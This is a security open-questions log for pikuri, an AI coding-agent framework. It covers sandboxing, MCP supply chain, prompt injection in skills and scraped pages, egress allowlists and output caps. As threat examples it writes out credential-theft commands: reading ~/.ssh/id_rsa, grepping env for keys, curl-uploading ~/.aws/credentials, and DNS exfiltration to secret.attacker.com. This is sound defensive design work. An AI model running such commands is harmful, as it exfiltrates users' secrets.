# Security open questions

Status: **open-questions log**, split from pikuri's
[`security-open-questions.md`](https://github.com/mvysny/pikuri/blob/master/design/ideas/security-open-questions.md)
when the shell and MCP moved here; the skills, egress-allowlist, output-size and provenance
entries followed on 2026-11-21, being features no pikuri promise waits on. The committed model is
[`SECURITY.md`](../../SECURITY.md). Promote an entry into its own idea file, or a fix, when the
friction shows up.

## Unsandboxed Bash modes

`Code::Bash::Sandbox::Bubblewrap` constrains `Bash` to the workspace's
readable/writable roots + an OS-runtime baseline, and is the default in
`bin/pikuri-code`. The residual concern is `--no-sandbox` / `--yolo`:
there `cat ~/.ssh/id_rsa`, `env | grep -i key` (the sandbox withholds exported
tokens, `D_sandbox_env_wall`; without it they are all there),
`curl --upload-file ~/.aws/credentials ...` all run as the user, and
the per-command Confirmer is the only line of defense (`--yolo`
disables that too). The banners now ask `systemd-detect-virt --vm`
(`Pikuri::Code::VirtualMachine`) and print the lifted-cage line in red
outside a VM; nothing refuses. Still open: refusing outside a VM, with
an explicit override, if red text proves easy to scroll past.

## MCP — open ergonomic / supply-chain questions

The committed MCP story is split across [`../SECURITY.md`](../../SECURITY.md):
the §"Code trust" bullet covers the Docker-for-untrusted-process
recommendation (suggested, not automatic); §"Defense: MCP
description verification" covers the `Mcp::Verifier` pre-flight
scan, with user-curation as the first line of defense. Open:

- **Per-tool first-use consent** (opencode-style sticky approval)
  is probably the right ergonomics shape — first invocation of
  the Gmail-MCP fetch tool is also the first consent prompt.
  Composes with the skill-gated lazy-add design.
- **First-class "wrap MCP in Docker" option** would close the
  supply-chain gap without leaving containerization to the user.
  Hard part: the wrapped MCP's egress / LLM-endpoint reachability
  re-opens the trifecta inside the container, so the egress
  policy of the inner Docker becomes the new question.

## Prompt injection inside skill descriptions

Skills are user-installed text, and "user-vetted by definition" ([`SECURITY.md`](../../SECURITY.md)
§"Code trust", the skills bullet) is now a claim the host makes per search base rather than an
assumption the framework carries: `Bundle::Base(trusted:)` defaults to *not* vetted and grades the
tool's untrusted leg (`pikuri:D_bundle_trust_grading`). That reports the exposure; it does not
defend against it. A `Mcp::Verifier`-shaped pass for skills would belt-and-braces it.

## An egress allowlist below the tool layer

Auto-deny non-allowlisted hosts for `bash` in interactive mode, prompting for first-use additions.
[`private-context-taint.md`](private-context-taint.md)
**kills the user-curated `fetch` whitelist** — the hosts people want to fetch are interactive,
hence attacker-readable (a whitelisted `github.com` exfiltrates through a gist) — so the surviving
live shape is the `bash`-egress / network-layer version. Gondolin's egress-proxy pattern
(`R_permissions`) is the heavyweight structural version. Whatever the layer, DNS
(`nslookup secret.attacker.com`, 60+ bytes per query, port 53 rarely filtered) is the leak an
HTTP-shaped allowlist forgets.

## Output size: one cap shape, and spill-over to disk

A 50 MB scraped page blows the context window: an API cost spike, or an OOM in the tokenizer.
Since `pikuri:D_no_step_limit` removed the step budget, the loop-count axis is uncovered by design,
so a per-tool output cap is the only bound on one turn's growth. Each tool enforces its own today —
`Bash`'s head+tail (`OUTPUT_HEAD` / `OUTPUT_TAIL`), `read`'s `MAX_BYTES`, `web_scrape`'s
`max_chars` — each shaped differently. Open: a uniform shape across tools, and spilling the
overflow to a tempfile whose path is returned to the LLM (PI and opencode both do,
`R_permissions`). Adjacent: [`context-overflow.md`](context-overflow.md), which handles the window
once it is full rather than the one observation that fills it.

## Provenance tags around tool output

Untrusted-content markers in the context render — `<untrusted>…</untrusted>` around a
`web_scrape` page, say. Cheap and partial, and an empirical question whether the model pays the
framing any attention. It is the obvious shape for a content-level defense against `web_scrape`
injection beyond persona separation, and it is a prompt-level hope rather than a structural cut —
pikuri's trifecta promise is "never by filtering", which is why it is the workshop's experiment to
run, or to reject.

